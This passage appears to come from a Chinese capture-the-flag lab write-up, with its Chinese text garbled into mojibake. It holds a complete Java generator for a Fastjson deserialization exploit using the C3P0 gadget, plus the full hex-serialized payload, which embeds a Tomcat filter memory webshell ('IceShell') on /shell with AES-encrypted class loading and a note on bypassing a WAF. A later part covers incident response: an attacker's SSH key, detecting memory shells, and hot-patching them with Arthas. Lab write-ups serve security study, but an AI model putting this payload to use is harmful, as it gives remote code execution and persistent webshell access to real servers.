package sec;import com.alibaba.fastjson.JSONArray;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javax.management.BadAttributeValueExpException;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Base64;import java.util.HashMap;public class C3P0 &#123;    public static void main(String[] args) throws Exception &#123;        String hex2 = bytesToHex(tobyteArray(gen()));        String FJ1247 = &quot;&#123;\n&quot; +                &quot;    \&quot;a\&quot;:&#123;\n&quot; +                &quot;        \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot; +                &quot;        \&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;\n&quot; +                &quot;    &#125;,\n&quot; +                &quot;    \&quot;b\&quot;:&#123;\n&quot; +                &quot;        \&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,\n&quot; +                &quot;        \&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot; + hex2 + &quot;;\&quot;,\n&quot; +                &quot;    &#125;\n&quot; +                &quot;&#125;\n&quot;;        System.out.println(FJ1247);    &#125;    //FastJsonåŸç”Ÿååºåˆ—åŒ–åŠ è½½æ¶æ„ç±»å­—èŠ‚ç     public static Object gen() throws Exception &#123;        TemplatesImpl templates = TemplatesImpl.class.newInstance();        byte[] bytes = Files.readAllBytes(Paths.get(&quot;E:\\CodeAudit\\project\\fastjson\\target\\classes\\sec\\IceShell.class&quot;)); // è¯»å–å…¶ä¸­å­—èŠ‚å³å¯        setValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;bytes&#125;);        setValue(templates, &quot;_name&quot;, &quot;1&quot;);        setValue(templates, &quot;_tfactory&quot;, null);        JSONArray jsonArray = new JSONArray();        jsonArray.add(templates);        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);        setValue(bd,&quot;val&quot;,jsonArray);        HashMap hashMap = new HashMap();        hashMap.put(templates,bd);        return hashMap;    &#125;    public static void setValue(Object obj, String name, Object value) throws Exception&#123;        Field field = obj.getClass().getDeclaredField(name);        field.setAccessible(true);        field.set(obj, value);    &#125;    //å°†ç±»åºåˆ—åŒ–ä¸ºå­—èŠ‚æ•°ç»„    public static byte[] tobyteArray(Object o) throws IOException &#123;        ByteArrayOutputStream bao = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(bao);        oos.writeObject(o);   //        return bao.toByteArray();    &#125;    //å­—èŠ‚æ•°ç»„è½¬åå…­è¿›åˆ¶    public static String bytesToHex(byte[] bytes) &#123;        StringBuffer stringBuffer = new StringBuffer();        for (int i = 0; i &lt; bytes.length; i++) &#123;            String hex = Integer.toHexString(bytes[i] &amp; 0xff);      //bytes[]ä¸­ä¸ºå¸¦ç¬¦å·å­—èŠ‚-255~+255ï¼Œ&amp;0xff: ä¿è¯å¾—åˆ°çš„æ•°æ®åœ¨0~255ä¹‹é—´            if (hex.length()&lt;2)&#123;                stringBuffer.append(&quot;0&quot; + hex);   //0-9 åˆ™åœ¨å‰é¢åŠ â€˜0â€™,ä¿è¯2ä½é¿å…åé¢è¯»å–é”™è¯¯            &#125;else &#123;                stringBuffer.append(hex);            &#125;        &#125;        return stringBuffer.toString();    &#125;&#125;

è¿è¡Œexpå³å¯ç”Ÿæˆä¸€æ®µjsonæ•°æ®ï¼š
&#123;    &quot;a&quot;:&#123;        &quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;java.lang.Class&quot;,        &quot;val&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;    &#125;,    &quot;b&quot;:&#123;        &quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,        &quot;userOverridesAsString&quot;:&quot;HexAsciiSerializedMap:aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035b5b425b00065f636c6173737400125b4c6a6176612f6c616e672f436c6173733b4c00055f6e616d657400124c6a6176612f6c616e672f537472696e673b4c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b787000000000ffffffff757200035b5b424bfd19156767db37020000787000000001757200025b42acf317f8060854e00200007870000024e4cafebabe0000003401870a005e00cb0800cc09004b00cd0700ce0700cf0b000400d00700d10a000700cb08007e0b004900d208007a08007c0a00d300d40a00d300d50b000400d60800d70a00d800d90a002400da0a001c00db0a001c00dc0800dd0a004b00de0b00df00e00a00e100e20800e30a00e400e50800e60700e70700a30900e800e90a001c00ea0a00eb00ec0800ed0a002700ee0700ef0700f00a00e800f10a00eb00f20700f30a001c00f40a00f500ec0a001c00f60a00f500f70800f808009c0b00f900fa0800fb0a00fc00fd0700fe0a00d800ff0a003101000a00fc01010701020a003500cb0b000401030a010401050a003501060a00fc01070a001c010808010907010a08010b07010c0a003f010d0b010e010f0701100801110a001c01120800c80a001c01130a011400ec0a011401150701160b004901150701170a004b00cb0701180a004d00cb0a004d01190a004d011a0a004d011b0a0042011c07011d0a005300cb08011e0a0053011f0a0053011a09012001210a012001220a005301230a0042012407012507012607012707012801000270610100124c6a6176612f6c616e672f537472696e673b01000d436f6e7374616e7456616c75650100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c650100047468697301000e4c7365632f4963655368656c6c3b010004696e697401001f284c6a617661782f736572766c65742f46696c746572436f6e6669673b295601000c66696c746572436f6e66696701001c4c6a617661782f736572766c65742f46696c746572436f6e6669673b01000a457863657074696f6e73070129010008646f46696c74657201005b284c6a617661782f736572766c65742f536572766c6574526571756573743b4c6a617661782f736572766c65742f536572766c6574526573706f6e73653b4c6a617661782f736572766c65742f46696c746572436861696e3b29560100064c636c6173730100114c6a6176612f6c616e672f436c6173733b01000e736572766c65745265717565737401001e4c6a617661782f736572766c65742f536572766c6574526571756573743b01000f736572766c6574526573706f6e736501001f4c6a617661782f736572766c65742f536572766c6574526573706f6e73653b01000b66696c746572436861696e01001b4c6a617661782f736572766c65742f46696c746572436861696e3b010007726571756573740100274c6a617661782f736572766c65742f687474702f48747470536572766c6574526571756573743b010008726573706f6e73650100284c6a617661782f736572766c65742f687474702f48747470536572766c6574526573706f6e73653b01000773657373696f6e0100204c6a617661782f736572766c65742f687474702f4874747053657373696f6e3b01000b70616765436f6e7465787401000f4c6a6176612f7574696c2f4d61703b010002636c0100174c6a6176612f6c616e672f436c6173734c6f616465723b0100164c6f63616c5661726961626c65547970655461626c650100354c6a6176612f7574696c2f4d61703c4c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f4f626a6563743b3e3b01000d537461636b4d61705461626c6507011707012a07012b07012c0700ce0700cf07012d0701160700f30700e707012e01000764657374726f79010009527573685468657265010081284c6a6176612f6c616e672f436c6173733b4c6a6176612f6c616e672f436c6173734c6f616465723b4c6a617661782f736572766c65742f687474702f4874747053657373696f6e3b4c6a617661782f736572766c65742f687474702f48747470536572766c6574526571756573743b4c6a6176612f7574696c2f4d61703b295601000576617231380100224c6a6176612f6c616e672f436c6173734e6f74466f756e64457863657074696f6e3b010006646566696e6501001a4c6a6176612f6c616e672f7265666c6563742f4d6574686f643b01000675636c61737301000b636f6e7374727563746f7201001f4c6a6176612f6c616e672f7265666c6563742f436f6e7374727563746f723b010001750100124c6a6176612f6c616e672f4f626a6563743b010002556d0100016b010001630100154c6a617661782f63727970746f2f4369706865723b01000b65436c61737342797465730100025b4201000665636c617373010001610100016201000862797465636f646507012f0700ef07010a0100095369676e61747572650100a7284c6a6176612f6c616e672f436c6173733b4c6a6176612f6c616e672f436c6173734c6f616465723b4c6a617661782f736572766c65742f687474702f4874747053657373696f6e3b4c6a617661782f736572766c65742f687474702f48747470536572766c6574526571756573743b4c6a6176612f7574696c2f4d61703c4c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f4f626a6563743b3e3b29560100097472616e73666f726d010072284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b5b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b2956010008646f63756d656e7401002d4c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b01000868616e646c6572730100425b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b0701300100a6284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b29560100086974657261746f720100354c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b01000768616e646c65720100414c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b0100083c636c696e69743e01000666696c7465720100164c6a617661782f736572766c65742f46696c7465723b01000966696c7465724465660100314c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724465663b01000966696c7465724d61700100314c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724d61703b0100324c6f72672f6170616368652f636174616c696e612f636f72652f4170706c69636174696f6e46696c746572436f6e6669673b0100046e616d65010015776562617070436c6173734c6f61646572426173650100324c6f72672f6170616368652f636174616c696e612f6c6f616465722f576562617070436c6173734c6f61646572426173653b01000f7374616e64617264436f6e7465787401002a4c6f72672f6170616368652f636174616c696e612f636f72652f5374616e64617264436f6e746578743b010007436f6e666967730100194c6a6176612f6c616e672f7265666c6563742f4669656c643b01000d66696c746572436f6e6669677301000a536f7572636546696c6501000d4963655368656c6c2e6a6176610c00630064010010336164326664646665386261643865360c006000610100256a617661782f736572766c65742f687474702f48747470536572766c6574526571756573740100266a617661782f736572766c65742f687474702f48747470536572766c6574526573706f6e73650c013101320100116a6176612f7574696c2f486173684d61700c013301340701350c013601370c013801390c013a013b010004504f535407013c0c0109013d0c013e013f0c0140013f0c0141013b0100156a6176612e6c616e672e436c6173734c6f616465720c0093009407012c0c007001420701430c0144014701026479763636766741414144514147676f41424141554367414541425548414259484142634241415938615735706444344241426f6f54477068646d4576624746755a7939446247467a633078765957526c636a73705667454142454e765a4755424141394d6157356c546e5674596d5679564746696247554241424a4d62324e6862465a68636d6c68596d786c56474669624755424141523061476c7a415141445446553741514142597745414630787159585a684c327868626d63765132786863334e4d6232466b5a584937415141425a7745414653686251696c4d616d4632595339735957356e4c304e7359584e7a4f7745414157494241414a6251674541436c4e7664584a6a5a555a706247554241415a564c6d7068646d454d41415541426777414741415a415141425651454146577068646d4576624746755a7939446247467a633078765957526c636745414332526c5a6d6c755a554e7359584e7a415141584b46744353556b7054477068646d4576624746755a7939446247467a637a734149514144414151414141414141414941414141464141594141514148414141414f67414341414941414141474b6975334141477841414141416741494141414142674142414141414167414a4141414146674143414141414267414b4141734141414141414159414441414e414145414151414f41413841415141484141414150514145414149414141414a4b6973444b37363341414b7741414141416741494141414142674142414141414177414a4141414146674143414141414351414b414173414141414141416b4145414152414145414151415341414141416741540701480c0149014a01000b646566696e65436c61737301000f6a6176612f6c616e672f436c61737307014b0c014c00730c014d014e07012f0c014f0150010001550c015101520100206a6176612f6c616e672f436c6173734e6f74466f756e64457863657074696f6e0100106a6176612f6c616e672f4f626a6563740c015301540c015501560100156a6176612f6c616e672f436c6173734c6f616465720c015701580701590c015a01390c015b015c0100016707012d0c015d015e01000341455307015f0c0160016101001f6a617661782f63727970746f2f737065632f5365637265744b6579537065630c016201630c006301640c006a016501001673756e2f6d6973632f4241534536344465636f6465720c016601670701680c0169013b0c016a014a0c016b016c0c015b016d010006657175616c730100136a6176612f6c616e672f457863657074696f6e01000c4175746f6d6e6547726565740100306f72672f6170616368652f636174616c696e612f6c6f616465722f576562617070436c6173734c6f61646572426173650c016e016f0701700c017101720100286f72672f6170616368652f636174616c696e612f636f72652f5374616e64617264436f6e746578740100286f72672e6170616368652e636174616c696e612e636f72652e5374616e64617264436f6e746578740c017301520c017401750701760c0177017801000d6a6176612f7574696c2f4d617001000c7365632f4963655368656c6c01002f6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724465660c0179017a0c017b017c0c017d017c0c017e017f01002f6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724d61700100062f7368656c6c0c0180017c0701810c018201830c00c1013b0c0184017c0c018501860100306f72672f6170616368652f636174616c696e612f636f72652f4170706c69636174696f6e46696c746572436f6e66696701001b6f72672f6170616368652f636174616c696e612f436f6e74657874010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c65740100146a617661782f736572766c65742f46696c74657201001e6a617661782f736572766c65742f536572766c6574457863657074696f6e01001c6a617661782f736572766c65742f536572766c65745265717565737401001d6a617661782f736572766c65742f536572766c6574526573706f6e73650100196a617661782f736572766c65742f46696c746572436861696e01001e6a617661782f736572766c65742f687474702f4874747053657373696f6e0100136a6176612f696f2f494f457863657074696f6e0100186a6176612f6c616e672f7265666c6563742f4d6574686f64010039636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f5472616e736c6574457863657074696f6e01000a67657453657373696f6e01002228294c6a617661782f736572766c65742f687474702f4874747053657373696f6e3b010003707574010038284c6a6176612f6c616e672f4f626a6563743b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100106a6176612f6c616e672f54687265616401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b010015676574436f6e74657874436c6173734c6f6164657201001928294c6a6176612f6c616e672f436c6173734c6f616465723b0100096765744d6574686f6401001428294c6a6176612f6c616e672f537472696e673b0100106a6176612f6c616e672f537472696e67010015284c6a6176612f6c616e672f4f626a6563743b295a010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b01000d6765745375706572636c6173730100076765744e616d65010040284c6a617661782f736572766c65742f536572766c6574526571756573743b4c6a617661782f736572766c65742f536572766c6574526573706f6e73653b29560100106a6176612f7574696c2f42617365363401000a6765744465636f6465720100074465636f64657201000c496e6e6572436c617373657301001c28294c6a6176612f7574696c2f426173653634244465636f6465723b0100186a6176612f7574696c2f426173653634244465636f6465720100066465636f6465010016284c6a6176612f6c616e672f537472696e673b295b420100116a6176612f6c616e672f496e7465676572010004545950450100116765744465636c617265644d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b01000d73657441636365737369626c65010004285a29560100096c6f6164436c617373010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b01000776616c75654f660100162849294c6a6176612f6c616e672f496e74656765723b010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100166765744465636c61726564436f6e7374727563746f72010033285b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f436f6e7374727563746f723b01001d6a6176612f6c616e672f7265666c6563742f436f6e7374727563746f7201000e676574436c6173734c6f6164657201000b6e6577496e7374616e6365010027285b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b01000c736574417474726962757465010027284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f4f626a6563743b29560100136a617661782f63727970746f2f43697068657201000b676574496e7374616e6365010029284c6a6176612f6c616e672f537472696e673b294c6a617661782f63727970746f2f4369706865723b010008676574427974657301000428295b42010017285b424c6a6176612f6c616e672f537472696e673b295601001728494c6a6176612f73656375726974792f4b65793b295601000967657452656164657201001a28294c6a6176612f696f2f42756666657265645265616465723b0100166a6176612f696f2f4275666665726564526561646572010008726561644c696e6501000c6465636f6465427566666572010007646f46696e616c010006285b42295b4201001428294c6a6176612f6c616e672f4f626a6563743b01000c6765745265736f757263657301002728294c6f72672f6170616368652f636174616c696e612f5765625265736f75726365526f6f743b0100236f72672f6170616368652f636174616c696e612f5765625265736f75726365526f6f7401000a676574436f6e7465787401001f28294c6f72672f6170616368652f636174616c696e612f436f6e746578743b010007666f724e616d650100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0100176a6176612f6c616e672f7265666c6563742f4669656c64010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b01000973657446696c746572010019284c6a617661782f736572766c65742f46696c7465723b295601000d73657446696c7465724e616d65010015284c6a6176612f6c616e672f537472696e673b295601000e73657446696c746572436c61737301000c61646446696c746572446566010034284c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724465663b295601000d61646455524c5061747465726e01001c6a617661782f736572766c65742f44697370617463686572547970650100075245515545535401001e4c6a617661782f736572766c65742f44697370617463686572547970653b01000d7365744469737061746368657201001261646446696c7465724d61704265666f7265010034284c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724d61703b29560021004b005e0001005f0001001200600061000100620000000200020008000100630064000100650000003d000200010000000b2ab700012a1202b50003b10000000200660000000e00030000002600040024000a002700670000000c00010000000b0068006900000001006a006b00020065000000350000000200000001b10000000200660000000600010000002a00670000001600020000000100680069000000000001006c006d0001006e000000040001006f00010070007100020065000003180006000a000001ab2bc000043a042cc000053a051904b9000601003a06bb000759b700083a07190712091906b9000a0300571907120b1904b9000a0300571907120c1905b9000a030057b8000db6000e3a081904b9000f01001210b600119901541908b60012b60013b600141215b6001199001e1908b60012b600133a092a19091908190619041907b60016a7011e1908b60012b60013b60013b600141215b600119900211908b60012b60013b600133a092a19091908190619041907b60016a700ea1908b60012b60013b60013b60013b600141215b600119900241908b60012b60013b60013b600133a092a19091908190619041907b60016a700b01908b60012b60013b60013b60013b60013b600141215b600119900271908b60012b60013b60013b60013b600133a092a19091908190619041907b60016a700701908b60012b60013b60013b60013b60013b60013b600141215b6001199002a1908b60012b60013b60013b60013b60013b600133a092a19091908190619041907b60016a7002a1908b60012b60013b60013b60013b60013b60013b600133a092a19091908190619041907b600162d2b2cb900170300b100000004006600000072001c0000002d0006002e000c002f00150030001e0031002a00320036003300420034004a003500590037006c0038007600390087003a009d003b00aa003c00bb003d00d4003e00e4003f00f5004001110041012400420135004301540044016a0045017b00470194004801a2004b01aa004e006700000098000f0076001100720073000900aa001100720073000900e4001100720073000901240011007200730009016a001100720073000901940016007200730009000001ab006800690000000001ab007400750001000001ab007600770002000001ab007800790003000601a5007a007b0004000c019f007c007d000500150196007e007f0006001e018d008000810007004a016100820083000800840000000c0001001e018d0080008500070086000000330007ff0087000907008707008807008907008a07008b07008c07008d07008e07008f000033393ffb0045fc0026070090fa0007006e0000000600020091006f000100920064000100650000002b0000000100000001b10000000200660000000600010000005100670000000c00010000000100680069000000010093009400020065000002e50006001200000133b800181219b6001a3a062b121b06bd001c5903121d535904b2001e535905b2001e53b6001f3a07190704b60020013a082c1221b600223a08a700293a0919072c06bd00245903190653590403b800255359051906beb8002553b60026c0001c3a08190804bd001c5903122753b600283a09190904b60029190904bd002459032ab60012b6002a53b6002b3a0a1908122c04bd001c5903121d53b6001f3a0b190b04b6002012023a0c2d122d190cb9002e0300122fb800303a0d190d05bb003159190cb60032122fb70033b60034190dbb003559b700361904b900370100b60038b60039b6003a3a0e190b190a04bd00245903190e53b60026c0001c3a0f190fb6003b3a10190f123c04bd001c5903122453b6001f3a11191104b600201911191004bd00245903190553b6002657a700053a07b1000200300038003b0023000a012d0130003d000400660000006a001a00000054000a005700270058002d00590030005c0038005f003b005d003d005e006100610071006200770063008c0064009e006500a4006600a8006700b2006800b9006900cd006a00e8006b00fd006c0104006d0116006e011c006f012d007101300070013200730067000000c00013003d002400950096000900270106009700980007003000fd009900730008007100bc009a009b0009008c00a1009c009d000a009e008f009e0098000b00a80085009f0061000c00b9007400a000a1000d00e8004500a200a3000e00fd003000a40073000f0104002900a5009d00100116001700a60098001100000133006800690000000001330072007300010000013300820083000200000133007e007f000300000133007a007b000400000133008000810005000a012900a700a3000600840000000c0001000001330080008500050086000000480004ff003b000907008707009007008f07008d07008b07008e07001d0700a807009000010700a925ff00ce000707008707009007008f07008d07008b07008e07001d00010700aa0100ab0000000200ac000100ad00ae000200650000003f0000000300000001b1000000020066000000060001000000760067000000200003000000010068006900000000000100af00b000010000000100b100b20002006e00000004000100b3000100ad00b400020065000000490000000400000001b10000000200660000000600010000007900670000002a0004000000010068006900000000000100af00b000010000000100b500b600020000000100b700b80003006e00000004000100b3000800b9006400010065000001da0005000a000000de123e4bb8000db6000ec0003f4c2bb60040b900410100c000424d1243b800441245b600464e2d04b600472d2cb60048c000493a041904123eb9004a0200c7009cbb004b59b7004c3a05bb004d59b7004e3a0619061905b6004f1906123eb6005019061905b60012b60014b600512c1906b60052bb005359b700543a0719071255b600561907123eb600571907b20058b60059b6005a2c1907b6005b125c05bd001c5903125d535904124d53b600283a08190804b60029190805bd002459032c535904190653b6002bc0005c3a091904123e1909b9000a030057a700044bb10001000000d900dc003d000300660000006600190000007d0003007e000d007f001a008000250081002a0082003400830040008400490085005200860059008700600088006d00890073008a007c008b0083008c008a008d0095008e009b008f00b0009000b6009100cd009200d9009500dc009400dd0097006700000066000a0049009000ba00bb00050052008700bc00bd0006007c005d00be00bf000700b00029009a009b000800cd000c006c00c00009000300d600c100610000000d00cc00c200c30001001a00bf00c400c50002002500b400c600c70003003400a500c80081000400860000000a0003fb00d9420700aa00000200c90000000200ca01460000000a000100e400e101450009707400013170770100787372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d65737361676571007e00055b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0014707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000027372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e00057870000000297400087365632e43335030740009433350302e6a61766174000367656e7371007e00170000001171007e001971007e001a7400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00137872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e0023787372001e636f6d2e616c69626162612e666173746a736f6e2e4a534f4e417272617900000000000000010200014c00046c69737471007e001378707371007e00220000000177040000000171007e00077878;&quot;,    &#125;&#125;

ç›´æ¥æ‰“ä¼šå‘ç°å†æ¬¡è¢«æ‹¦äº†ï¼Œè¯´æ˜è¿‡æ»¤çš„userOverridesAsString

ç›´æ¥å¯¹å…¶Unicodeç¼–ç ç»•è¿‡å‘ç°è¿˜æ˜¯æ— æ³•ç»•è¿‡ï¼Œä¸è¿‡å¯ä»¥é€šè¿‡æ·»åŠ _æˆ–+å¤„ç†å…³é”®å­—ç»•è¿‡

å¯å‚è€ƒï¼šhttps://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/


å‡ºç°ä¸Šè¿°æŠ¥é”™åˆ™è¯´æ˜å†…å­˜é©¬æ³¨å…¥æˆåŠŸ

åº”æ€¥å“åº”â…¢é¦–å…ˆæ’æŸ¥éšè—ç”¨æˆ·ã€ç«¯å£ã€è¿›ç¨‹ç­‰å¹¶æ— å¼‚å¸¸ï¼Œæ¥ç€å‘ç°å­˜åœ¨sshåé—¨ï¼Œç›´æ¥åˆ é™¤å³å¯
/home/vulntarget/ &gt;cat ~/.ssh/authorized_keysssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEisTimbKUHUXBUJUo4WbOxTQY9VHM1ZaL35RQgBTwNUWlm353XdHcq8HxA1U9MLp/Lepaw/U5tQ5Y2qF9TzhAUoTiAiwAKREFuLHugeL/eWTyZAnRN/2OQ4XX5IBsMDFbZAvNRUSaOLIAtpNz/ZFj1NDuCWR7p/2EYFB0YvHxaS9OWrUb0Zh21GOQR6apCYY/+IbVVGKr+MwlI0Df0kv7hns9IpapwEctI0rzayL+NYtvFUyterTV4HfnPij7LxyGqK62ZEsJOQSnON+mj1Dp6Ukz1krdUoVmxrEseQe6CJemq3BHolDi7zbQo4BbxnTQUYwzl9li04ZL2h75xQuUEPb6nxVanUEEJ7CT/fIclvCHsdO9MJ5l2V8ROetkukslKlPxEVZ8q2Up1S4SQk90cYLLnj2+wJNSNw343kIOrIjtQY8E16RhVqVMMGmKW5Ui/FU6X/lfKjISjxqBN6HB65Q74ISMD+IN3kVPSI52rwqaea5/TdjKiDxzkO8bAXU= hacker@anonymous

å…¶æ¬¡åœ¨&#x2F;var&#x2F;local&#x2F;ç›®å½•ä¸‹ä¹Ÿæœ‰ä¸ªapp.jarï¼Œä¸‹è½½ä¸‹æ¥åç¼–è¯‘çœ‹çœ‹å¹¶æœªå‘ç°å¼‚å¸¸

æ‹¿Dç›¾æ£€æµ‹ä¹Ÿæ²¡å‘ç°å¼‚å¸¸æ–‡ä»¶

ç„¶åç”¨copagentå·¥å…·æ£€æµ‹ï¼Œè¿è¡Œåä¼šè¯†åˆ«æ­£åœ¨è¿è¡Œçš„åº”ç”¨ï¼Œè¾“å…¥å¯¹åº”IDï¼Œä¼šåœ¨åŒç›®å½•ä¸‹ç”Ÿæˆ.copagentç›®å½•å‚¨å­˜ç»“æœ

https://github.com/LandGrey/copagent/raw/release/cop.jar


result.txtä¸­è®°å½•æ‰€æœ‰çš„ç±»åŠå±é™©ç­‰çº§

åœ¨classç›®å½•ä¸‹ä¼šä¿å­˜æœ¨é©¬ä»¥åŠè¿è¡Œçš„ç±»

è¿˜åŸå‡ºå†…å­˜é©¬ï¼ˆIceShellæ˜¯æˆ‘è‡ªå·±æ‰“è¿›å»çš„å¯ä»¥æ’é™¤æ‰ï¼Œå‰©ä¸‹å°±æ˜¯å¼‚å¸¸çš„
ShellServletå­˜åœ¨å¾ˆæ˜æ˜¾çš„exec

HttpServletä¹Ÿä¸éš¾çœ‹å‡ºå¾ˆæœ‰å¯èƒ½å°±æ˜¯å†…å­˜é©¬

è¿˜å¯ä»¥æ‹¿Dç›¾æ¥æ‰«ææ£€æŸ¥

è¿™é‡Œçƒ­æ›´æ–°æˆ‘ä»¬æ¢ä¸€ç§æ–¹å¼ï¼Œç›´æ¥åˆ©ç”¨Arthaså·¥å…·åç¼–è¯‘å¹¶æå–ShellServletç±»çš„ä»£ç 
jad --source-only ShellServlet &gt; /tmp/ShellServlet.java


æ¥ç€å»&#x2F;tmpç›®å½•ä¸‹æ‰¾åˆ°ShellServlet.javaè¿›è¡Œä¿®æ”¹

ç„¶åç›´æ¥è®©ä»–çš„ç±»åŠ è½½å™¨å»ç¼–è¯‘ï¼Œå†å»çƒ­æ›´æ–°å³å¯
sc -d *ShellServlet | grep classLoaderHashmc -c 56ae04b4 /tmp/ShellServlet.java -d /var/retransform /var/ShellServlet.class 


åŒç†å¯¹HttpServletç±»è¿›è¡Œçƒ­æ›´æ–°
jad --source-only ShellServlet &gt; /tmp/ShellServlet.javavim /tmp/HttpServlet.javasc -d *HttpServlet | grep classLoaderHashmc -c 49c2faae /tmp/HttpServlet.java -d /var/retransform /var/javax/servlet/http/HttpServlet.class



åº”æ€¥æˆåŠŸï¼Œæ‹¿ä¸‹flag3ï¼šflag{57f92fa987141af1770d2b0ca894960f}

]]></content>
      <categories>
        <category>é¶åœºé€šå…³</category>
      </categories>
      <tags>
        <tag>vulntarget</tag>
      </tags>
  </entry>
</search>
